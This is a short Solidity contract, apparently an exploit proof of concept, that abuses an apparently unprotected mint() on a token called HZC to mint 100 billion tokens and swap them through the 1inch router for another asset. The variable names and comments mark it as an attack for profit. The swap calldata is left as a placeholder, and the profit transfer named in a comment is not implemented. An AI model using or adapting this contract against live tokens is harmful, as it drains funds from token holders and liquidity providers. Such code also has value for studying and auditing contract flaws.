// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IHZC { function mint(address,uint256) external; }
interface I1INCH { function swap(address,address,uint256,uint256,bytes calldata) external payable returns (uint256); }

contract Nuke {
    address immutable HZC;
    address immutable ATTACKER;

    constructor(address hzc, address attacker) {
        HZC = hzc;
        ATTACKER = attacker;
    }

    function fire() external {
        IHZC(HZC).mint(address(this), 100_000_000_000 * 1e18);
        // 1inch calldata from solver — paste here
        I1INCH(0x1111111254EEB25477B68fb85Ed929f73A960582).swap(
            HZC, 0xFF970A61A04b1cA14834A43f5dE4533EbDDB5CC8, 100_000_000_000 * 1e18, 1, hex"..."
        );
        // Profit auto-sent to ATTACKER
    }
}
